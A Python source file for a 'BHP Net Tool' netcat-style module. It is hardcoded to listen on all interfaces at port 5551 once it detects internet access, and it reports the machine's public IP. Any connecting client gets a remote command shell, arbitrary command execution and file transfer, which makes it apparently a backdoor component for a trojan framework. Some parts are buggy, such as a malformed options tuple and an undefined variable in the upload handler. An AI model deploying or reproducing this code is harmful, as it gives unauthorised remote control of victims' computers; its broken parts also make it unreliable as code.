#### You can modify the name of this file ####

from requests import get
import sys
import socket
import time
import threading
import os
import subprocess

REMOTE_Svr = "www.google.com"
ip = ""
opts = (("-l", "True")) #("-t", "172.16.222.1"),("-p", "5551")
listen 		   = False
command 	   = False
upload 		   = False
execute		   = ""
targetHost	   = ""
getf_fromClient= ""
getf_fromServer= ""
port  		   = 5551

def usage():
  print("BHP Net Tool")
  print()
  print( "Usage: bhpnet.py -t target_host -p port")
  exit()

def client_sender(buf):
  client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  usr=os.getenv("USERNAME")
  try:
    while 1:
      try:
        client.connect((targetHost,port))
        break
      except:
        time.sleep(2)
    if len(buf):
      client.send(str(usr+"@"+buf).encode())
    #Make a chat with a server
    #buffer = input(str(usr+"> "))
    while True:
      recv_len = 1
      response = ""
      while recv_len:
          data = client.recv(4096)
          recv_len = len(data)
          response += str(data.decode())
          data=""
          if recv_len > 0 and recv_len < 4096:
              break
      print( targetHost+"> "+response)
      if "exitTapa" in response :
           break;
      # wait for more input
      buffer = input(usr+"> ")
      client.send(buffer.encode())
  except:
    print("[*] Exception! Exiting, Close connection")
    client.close()
def run_command(command):
  command = command + "\r\n"
  # trim the newline
  command = command.rstrip() #command devient tuple with args
  try:
    #p=subprocess.Popen(command, stdout=subprocess.PIPE)
    #output = p.communicate()[0]
    output = subprocess.check_output(command,stderr=subprocess.STDOUT, shell=True)
    output = output.decode()
  except:
    output = "Failed to execute command. Possible reasons: command not found, Permission denied or dpkg error (no internet,...).\r\n"
  # send the output back to the client
  return output

def client_handler(client_socket, addr):
  global upload
  global execute
  global command
  
  #check for upload
  if len(getf_fromClient):
    file_buffer=""
    while True:
        data = client_socket.recv(1024)
        if not data:
            break
        else:
            file_buffer += data
    try:
        fileDesc = open(getf_fromClient, "wb")
        fileDesc.write(fileContent)
        fileDesc.close()
        client_socket.send("Successfully saved file to %s\r\n" % getf_fromClient)
        print( getf_fromClient+" has been successfully saved")
    except:
        client_socket.send("Failed to save "+ getf_fromServer)
        print("Failed to save "+ getf_fromServer)
    
  if len(getf_fromServer):
    try:
        fileDesc = open(getf_fromServer, "rb")
        fileContent = fileDesc.read()
        fileDesc.close()
        client_socket.send(fileContent)
        print( getf_fromServer+" has been sent")
    except:
        client_socket.send("Failed to find "+ getf_fromServer)
        print("Failed to send "+ getf_fromServer)

  if len(execute):
    output=run_command(execute)
    client_socket.send(output.encode())

  if command:
    title = "*_*Type exit cmd to QUIT*_*\n"
    client_socket.send(title.encode())
    ARepertory=run_command("cd").split("\r")[0]
    machineName=os.getenv("COMPUTERNAME")
    usr = os.getenv("USERNAME")
    #machineName=run_command("hostname").split("\n")[0]
    while True:
        time.sleep(0.2)
        anonym = "<"+usr+"@"+machineName+">"+ARepertory+"$ "
        client_socket.send(anonym.encode()) # show a simple prompt
        cmd_buffer = ""
        dest=""
        while "\n" not in cmd_buffer:
            cmd_buffer += client_socket.recv(1024).decode()
        cmd_buffer = cmd_buffer.split("\n")[0]
        if "cd" in cmd_buffer and len(cmd_buffer)>3: #Support only  <staticPath>
            dest = cmd_buffer.split(" ")[1]
            ARepertory = dest
        else: #to avoid problem for relativ path
            #TODO: support relative path
            cmd_buffer = "cd "+ARepertory+"&"+cmd_buffer

        response = run_command(cmd_buffer)
        # send back the cmd output
        #print("response %s sent to client %s"%(response, addr[0]) )
        if response=="":
            response = "Action successfully complete\n"
        client_socket.send(response.encode())

def start_server():
  global targetHost
  # if no target is defined, we listen on all interfaces
  if not len(targetHost):
    targetHost = "0.0.0.0"
  server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  try:
    server.bind((targetHost,port))  #print("ServerLoop successfully binding ...")
    server.listen(5)
    while True:
      client_socket, addr = server.accept() #Bloquante
      # spin off a thread to handle our new client
      client_thread =  threading.Thread(target=client_handler,args=(client_socket,addr,))
      client_thread.start()
  except:
    #TODO: log file
    print("Exception elevated")
  server.close()
    
def is_connected():
  global ip
  try:
    host = socket.gethostbyname(REMOTE_Svr)
    s = socket.create_connection((host, 80), 2)
    ip = get('https://api.ipify.org').text
    return True
  except:
     print("no connection")
  return False

def server_loop():
  while not is_connected():
    time.sleep(10)
  try:
    svr_thread =  threading.Thread(target=start_server)
    svr_thread.start()
    return str("Server ip is %s"%ip )
  except:
    return str("Exception elevated in netcat:server_loop()" )

def run(**args): 
  global listen
  global execute
  global command
  global upload
  global targetHost
  global port
  print("[*] In WinNetcat module.") #Todelete

  for o,a in opts:
    if o in ("-h","--help"):
        usage()
    elif o in ("-l","--listen"):
        listen = True
    elif o in ("-e", "--execute"):
        execute = a
    elif o in ("-c", "--commandshell"):	
        command = True
    elif o in ("-u", "--upload"):
        getf_fromClient = a
    elif o in ("-d", "--download"):
        getf_fromServer = a
    elif o in ("-t", "--target"):
        targetHost = a
    elif o in ("-p", "--port"):
        port = int(a)
    else:
        assert False,"Unhandled Option"

  #*_* Case of Client send data from stdin; Chat with the server
  if not listen and len(targetHost) and port > 0:
    buffer = os.getenv("COMPUTERNAME")
    clt_thread =  threading.Thread(target=client_sender, args=(buffer,))
    clt_thread.start()
    return "CLient is trying to connect to %s:%s"%(targetHost,port)
  #*_* Case of server: upload things, execute commands, and drop a shell back
  if listen:
    ch = server_loop()
    return ch

